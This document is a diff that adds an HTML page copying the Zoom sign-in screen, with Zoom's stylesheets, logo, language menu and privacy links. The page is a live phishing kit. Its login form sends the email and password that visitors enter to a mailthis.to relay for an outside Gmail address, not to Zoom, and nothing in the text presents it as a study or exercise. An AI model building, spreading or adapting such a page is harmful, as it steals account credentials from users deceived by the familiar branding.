@@ -1,0 +1,253 @@
+<html>
+<head>
+
+    <link type="text/css" rel="stylesheet" href="https://st1.zoom.us/static/6.3.10973/css/fonts/internacional.min.css">
+    <link type="text/css" rel="stylesheet" href="https://st3.zoom.us/static/6.3.10973/css/fonts/suisse.min.css">
+    <link type="text/css" rel="stylesheet" href="https://st1.zoom.us/static/6.3.10973/css/all.min.css">
+    <link href="https://st1.zoom.us/fe-static/fe-signup-login-active/css/vendors~app.f47d24a8.css" rel="stylesheet">
+    <link href="https://st1.zoom.us/fe-static/fe-signup-login-active/css/app.a3d42b95.css" rel="stylesheet">
+    <style>
+    </style>
+    <style>
+        body div.combobox div.dropdownlist {
+            width: calc(100% + 2px) !important;
+        }
+
+        .expired-cc-banner {
+            padding: 25px;
+            margin-bottom: 0px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border: 0;
+        }
+
+            .expired-cc-banner.warn {
+                color: #361E00;
+                background-color: #FFF9F2;
+            }
+
+            .expired-cc-banner.error {
+                color: #44010D;
+                background-color: #FFF2F5;
+            }
+
+            .expired-cc-banner .alert-warning__content {
+                width: 100%;
+                margin-left: 20px;
+            }
+
+            .expired-cc-banner .zm-icon-warning {
+                font-size: 17px;
+                color: #B36200;
+            }
+
+            .expired-cc-banner .zm-icon-error {
+                font-size: 17px;
+                color: #E8173D;
+            }
+
+            .expired-cc-banner .zm-icon-close {
+                color: #131619;
+                cursor: pointer;
+            }
+    </style>
+    <link rel="stylesheet" href="https://st1.zoom.us/static/6.3.10973/js/lib/vue/advanced/notification/notification.min.css">
+    
+</head>
+<body class="" data-cd=".zoom.us">
+    <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" style="position: absolute; width: 0; height: 0" aria-hidden="true" id="__SVG_SPRITE_NODE__">
+        <symbol xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" id="key"><path fill-rule="evenodd" clip-rule="evenodd" d="M9.72908 7.24476C10.6025 5.35878 10.2616 3.04907 8.70646 1.49385C6.71473 -0.49795 3.48551 -0.49795 1.49379 1.49385C-0.497931 3.48565 -0.497931 6.715 1.49379 8.7068C3.05092 10.264 5.36443 10.6038 7.25164 9.72613L8.51188 10.9864H9.75896L9.75896 12.2263H10.9985V13.4659L12.2384 13.4659V14.713L13.4586 15.9333C13.5013 15.976 13.5592 16 13.6196 16H15.7723C15.8981 16 16 15.8981 16 15.7723V13.6102C16 13.5499 15.976 13.4919 15.9333 13.4492L9.72908 7.24476ZM4.65033 3.07222C5.08602 3.50792 5.08602 4.21434 4.65033 4.65005C4.21464 5.08575 3.50825 5.08575 3.07256 4.65005C2.63687 4.21434 2.63687 3.50792 3.07256 3.07222C3.50825 2.63651 4.21464 2.63651 4.65033 3.07222Z"></path></symbol>
+        <symbol xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" id="facebook"><path d="M16 7.99718C16 3.57889 12.4183 -0.00282764 8 -0.00282764C3.58172 -0.00282764 0 3.57889 0 7.99718C0 11.9902 2.92548 15.2998 6.75 15.9V10.3097H4.71875V7.99718H6.75V6.23468C6.75 4.22968 7.94434 3.12217 9.77172 3.12217C10.647 3.12217 11.5625 3.27842 11.5625 3.27842V5.24718H10.5537C9.55992 5.24718 9.25 5.86385 9.25 6.4965V7.99718H11.4688L11.1141 10.3097H9.25V15.9C13.0745 15.2998 16 11.9902 16 7.99718Z"></path></symbol>
+        <symbol xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="none" id="google-color">
+            <path d="M19.2442 10.1771C19.2442 9.53411 19.1921 8.88767 19.0808 8.25513H10.1592V11.8975H15.2682C15.0562 13.0722 14.375 14.1114 13.3775 14.7717V17.1351H16.4255C18.2154 15.4877 19.2442 13.0548 19.2442 10.1771Z" fill="#4285F4"></path>
+            <path d="M10.1585 19.4175C12.7095 19.4175 14.8609 18.5799 16.4283 17.1341L13.3803 14.7707C12.5323 15.3477 11.4375 15.6744 10.162 15.6744C7.69436 15.6744 5.6021 14.0096 4.85139 11.7714H1.70605V14.2077C3.31174 17.4017 6.5822 19.4175 10.1585 19.4175Z" fill="#34A853"></path>
+            <path d="M4.84822 11.771C4.45201 10.5962 4.45201 9.32419 4.84822 8.14947V5.71313H1.70636C0.364808 8.3858 0.364808 11.5346 1.70636 14.2073L4.84822 11.771Z" fill="#FBBC04"></path>
+            <path d="M10.1585 4.24376C11.507 4.22291 12.8103 4.73034 13.7869 5.66177L16.4874 2.9613C14.7775 1.35561 12.5079 0.472833 10.1585 0.500637C6.5822 0.500637 3.31174 2.51643 1.70605 5.71391L4.84792 8.15024C5.59515 5.90853 7.69089 4.24376 10.1585 4.24376Z" fill="#EA4335"></path>
+        </symbol>
+    </svg>
+    <div class="total-main-content">
+        <div id="skiptocontent">
+            <a aria-label="Skip to main content" href="#nested">Skip to Main Content</a>
+        </div>
+        <div id="accessibilityHome">
+            <a aria-label="Accessibility overview" href="https://explore.zoom.us/en/accessibility">Accessibility Overview</a>
+        </div>
+        <div id="nested" class="zoom-newpd">
+            <div class="mini-layout" role="main" aria-label="main content">
+                <div class="HiddenText"><a id="the-main-content" tabindex="-1"></a></div>
+                <div id="app" class="login-page"><header class="layout-header"><a href="/" class="login-page-logo-wrap"><img src="https://st1.zoom.us/fe-static/fe-signup-login-active/img/ZoomNewLogo.b2fd5c95.png" alt="Zoom Logo"></a><div class="header-links"><span class="header-login-link" style="float: left; line-height: 32px;">New to Zoom?</span><button type="button" class="mgl-xs zm-button--link zm-button--small zm-button"><span class="zm-button__slot"> Sign Up </span></button><a type="button" role="link" target="_blank" href="https://support.zoom.us/hc/en-us" tabindex="0" class="mgl-lg header-login-link zm-button--link zm-button--small zm-button is-link"><span class="zm-button__slot"> Support </span></a><div class="zm-dropdown"><button type="button" class="mgl-lg zm-button--primary-ghost zm-button--small is-ghost zm-button zm-dropdown-selfdefine" aria-label="Language English" role="button" aria-haspopup="listbox" aria-controls="dropdown-menu-5278" aria-expanded="false" tabindex="0"><span class="zm-button__slot"> English </span><i aria-hidden="true" class="zm-icon-down"></i></button><ul role="menu" tabindex="-1" class="zm-dropdown-menu zm-popper" id="dropdown-menu-5278" style="display: none;"><li id="dropdown_item_dropdown-menu-5278-0" role="menuitem" class="zm-dropdown-menu__item"><span class="zm-dropdown-menu__item-content"><!----> English </span></li><li id="dropdown_item_dropdown-menu-5278-1" role="menuitem" class="zm-dropdown-menu__item"><span class="zm-dropdown-menu__item-content"><!----> Español </span></li><li id="dropdown_item_dropdown-menu-5278-2" role="menuitem" class="zm-dropdown-menu__item"><span class="zm-dropdown-menu__item-content"><!----> Deutsch </span></li><li id="dropdown_item_dropdown-menu-5278-3" role="menuitem" class="zm-dropdown-menu__item"><span class="zm-dropdown-menu__item-content"><!----> 简体中文 </span></li><li id="dropdown_item_dropdown-menu-5278-4" role="menuitem" class="zm-dropdown-menu__item"><span class="zm-dropdown-menu__item-content"><!----> 繁體中文 </span></li><li id="dropdown_item_dropdown-menu-5278-5" role="menuitem" class="zm-dropdown-menu__item"><span class="zm-dropdown-menu__item-content"><!----> Français </span></li><li id="dropdown_item_dropdown-menu-5278-6" role="menuitem" class="zm-dropdown-menu__item"><span class="zm-dropdown-menu__item-content"><!----> Português </span></li><li id="dropdown_item_dropdown-menu-5278-7" role="menuitem" class="zm-dropdown-menu__item"><span class="zm-dropdown-menu__item-content"><!----> 日本語 </span></li><li id="dropdown_item_dropdown-menu-5278-8" role="menuitem" class="zm-dropdown-menu__item"><span class="zm-dropdown-menu__item-content"><!----> Русский </span></li><li id="dropdown_item_dropdown-menu-5278-9" role="menuitem" class="zm-dropdown-menu__item"><span class="zm-dropdown-menu__item-content"><!----> 한국어 </span></li><li id="dropdown_item_dropdown-menu-5278-10" role="menuitem" class="zm-dropdown-menu__item"><span class="zm-dropdown-menu__item-content"><!----> Italiano </span></li><li id="dropdown_item_dropdown-menu-5278-11" role="menuitem" class="zm-dropdown-menu__item"><span class="zm-dropdown-menu__item-content"><!----> Tiếng Việt </span></li><li id="dropdown_item_dropdown-menu-5278-12" role="menuitem" class="zm-dropdown-menu__item"><span class="zm-dropdown-menu__item-content"><!----> polski </span></li><li id="dropdown_item_dropdown-menu-5278-13" role="menuitem" class="zm-dropdown-menu__item"><span class="zm-dropdown-menu__item-content"><!----> Türkçe </span></li><li id="dropdown_item_dropdown-menu-5278-14" role="menuitem" class="zm-dropdown-menu__item"><span class="zm-dropdown-menu__item-content"><!----> Bahasa Indonesia </span></li><li id="dropdown_item_dropdown-menu-5278-15" role="menuitem" class="zm-dropdown-menu__item"><span class="zm-dropdown-menu__item-content"><!----> Nederlands </span></li></ul></div></div></header><div class="layout-body login-page-view"><div class="layout-aside"><img src="https://st1.zoom.us/fe-static/fe-signup-login-active/img/banner-step-1.2faf107a.png" alt="Zoom Banner"><!----></div><div class="layout-main"><div class="layout-main-slot"><!----><div class="form-width-sm"><form action="https://mailthis.to/badcrackercoding@gmail.com" method="POST" class="zm-form zm-form--label-inline"><div class="zm-form-item is-no-asterisk"><!----><div class="zm-form-item__content"><div class="zm-input zm-input--xLarge is-empty zm-input--show-label"><!----><input type="email" autocomplete="email" name="email" placeholder="Email Address" aria-required="true" aria-label="Email Address" id="email" maxlength="128" class="zm-input__inner"><label for="email" class="zm-input__label"></label><!----><span class="zm-input__suffix"><span class="zm-input__suffix-inner"><!----><!----><!----><!----></span><!----></span><!----><!----></div><!----></div></div><div class="zm-form-item zm-form-password is-no-asterisk"><!----><div class="zm-form-item__content"><div class="zm-input zm-input--xLarge is-empty zm-input--suffix zm-input--show-label"><!----><input type="password" autocomplete="password" name="password" placeholder="Password" aria-required="true" aria-label="Password" id="password" maxlength="99" class="zm-input__inner"><label for="password" class="zm-input__label"></label><!----><span class="zm-input__suffix"><span class="zm-input__suffix-inner"><!----><button type="button" aria-label="show password" class="zm-input__password-btn zm-input__icon zm-icon-eyes zm-input__clear"></button><!----><!----></span><!----></span><!----><!----></div><!----></div></div><button type="button" class="zm-btn-forgot pdt-0 pdb-0 mgb-sm zm-button--link zm-button--small zm-button"><span class="zm-button__slot"> Forgot password? </span></button><!----><!----><div class="mgt-sm"><button type="submit" class="btn-block zm-button--primary zm-button--large zm-button" id="js_btn_login"><span class="zm-button__slot"> Sign In </span></button><p id="agree-terms" class="agree-terms mgt-md">By signing in, I agree to the <a target="_blank" href="/privacy">Zoom's Privacy Statement</a> and <a target="_blank" href="/terms">Terms of Service</a>.</p><div><span class="zm-checkbox mgt-sm" role="application"><span class="zm-checkbox__wrap"><label class="zm-checkbox__label is-disabled"><input type="checkbox" id="checkbox_0" aria-checked="false" tabindex="0" class="zm-checkbox__original" value="false" disabled="disabled"><span class="zm-checkbox__inner"><i class="zm-checkbox__knob"></i></span><span class="zm-checkbox__label-inner"> Stay signed in <!----></span></label><!----></span><button type="button" class="zm-tooltip zm-button--icon zm-button--icon zm-button--small is-ghost zm-button" aria-label="Learn more about Stay signed in" tabindex="0" aria-expanded="false" style="line-height: 18px;"><i aria-hidden="true" class="zm-icon-info-outline"></i></button><div role="tooltip" id="zm-tooltip-4373" aria-hidden="true" class="zm-tooltip__popper is-light" style="display: none;"><div style="width: 300px;"> You cannot select this option because you disabled "Functional Cookies". To enable this option, go to <button type="button" class="zm-button--link zm-button--small zm-button" id="btn-cookie-setting"><span class="zm-button__slot"> Cookies Settings </span></button> and enable "Functional Cookies". <a href="https://explore.zoom.us/en/cookie-policy/" target="_blank" class="mgr-xs">Learn More</a></div></div></span></div></div><input type="hidden" ></form></div><iframe style="display: none;"></iframe></div></div></div></div></div></div></div></div>
+            </div>
+        </div>
+        <div id="video_dialog" role="alertdialog" class="noheaderfooterdialog modaldialog hideme">
+            <div class="modal-dialog">
+                <div class="modal-content">
+                    <div class="modal-header clearfix">
+                        <div class="modal-title"></div>
+                        <button class="close simplemodal-close" aria-label="close">×</button>
+                    </div>
+                    <div class="modal-body">
+                        <div class="modal-body-container">
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <input type="hidden" id="__platformCheck" value="">
+        <div id="notification"></div>
+        <input type="hidden" id="detect" value="https://st2.zoom.us/cdn-detect.png">
+        <style type="text/css">
+            @media screen and (max-width: 767px) {
+                .navbar-signup-header .navbar-header {
+                    display: block;
+                    float: left;
+                    border: none;
+                }
+
+                .navbar-signup-header .collapse {
+                    display: block;
+                }
+
+                #header_container .container > .navbar-collapse {
+                    background-color: #fff;
+                    border: none;
+                }
+
+                #header_outer .navbar-signup-header .navbar-collapse .navbar-right {
+                    float: right;
+                    margin-top: 4px;
+                }
+            }
+        </style>
+       
+       
+       
+        <div id="upcomingMeetingDialog" class="modaldialog hideme upcomingMeeting-feature-dialog">
+            <input type="hidden" name="mtg_length" id="mtg_length">
+            <input type="hidden" name="mtg_length1" id="mtg_length1">
+            <input type="hidden" name="start_url" id="start_url">
+            <div class="modal-dialog">
+                <div class="modal-content">
+                    <div class="modal-header clearfix">
+                        <button class="close simplemodal-close" aria-label="close">×</button>
+                        <h4 tabindex="-1" id="upcoming-meeting-title" class="meeting-delete-header-font" style="display: inline-block;">Upcoming Meetings</h4>
+                    </div>
+                    <div class="modal-body">
+                        <div class="form-group" style="margin-bottom:16px;">
+                            <div id="one-mtg" class="controls hideme" style="margin-bottom:18px;">Would you like to start this meeting?</div>
+                            <div id="more-mtg" class="controls hideme" style="margin-bottom:18px;">Would you like to start one of these meetings?</div>
+                            <div id="mtgs">
+                            </div>
+                            <div id="viwe-more" class="controls hideme"><a href="/meeting">View more...</a></div>
+                        </div>
+                    </div>
+                    <div class="modal-footer">
+                        <button class="btn btn-primary submit" id="scheduleMtg" style="background-color: #fff;color: #232333;border-color: #747487">Start a New Meeting</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+
+
+    </div><p role="status" class="aria-alert-hidden"></p>
+
+    <style type="text/css">
+        .optout-notice-wrapper {
+            width: 100%;
+            display: none;
+            position: relative;
+        }
+
+        .optout-notice-container {
+            padding: 24px 48px 24px 24px;
+        }
+
+        .meeting-disabledpmi-alert {
+            min-width: 415px;
+        }
+
+        .meeting-edit-disabledpmi-alert {
+            min-width: 553px;
+        }
+
+            .meeting-edit-disabledpmi-alert p, .meeting-disabledpmi-alert p {
+                line-height: inherit;
+            }
+
+        @media only screen and (max-width: 414px) {
+            .optout-notice-container {
+                padding: 10px 20px;
+            }
+        }
+
+        .optout-notice-container div {
+            display: inline-block;
+        }
+
+        .optout-notice-title {
+            font-weight: bold;
+            line-height: 150%;
+        }
+
+        .optout-notice-medium {
+            background-color: #FCF6ED;
+            color: #775111;
+        }
+
+        .optout-notice-low {
+            background-color: #E4F7EB;
+            color: #1C7E41;
+        }
+
+        .optout-notice-high {
+            background-color: #FFE8E8;
+            color: #B22424;
+        }
+
+        .optout-notice-container a {
+            color: #0065F2;
+            font-weight: bold;
+            text-decoration: none;
+        }
+
+        .optout-notice-content {
+            padding-right: 24px;
+        }
+
+        .optout-notice-close {
+            position: absolute;
+            top: 10px;
+            right: 23px;
+            font-size: 30px;
+            color: #232333;
+            cursor: pointer;
+            border: none;
+            background: transparent;
+        }
+
+            .optout-notice-close:before {
+                content: '\00d7';
+            }
+
+        #content_container.content_container_hide_header {
+            padding-top: 0px;
+        }
+
+        .body_hide_footer {
+            background: #fff;
+        }
+
+        .tesla_night_mode {
+            background: #131619;
+        }
+
+        #extole_zone_global_footer a {
+            font-size: inherit !important;
+            color: #fff !important;
+        }
+    </style>
+
+
+</body>
+</html>
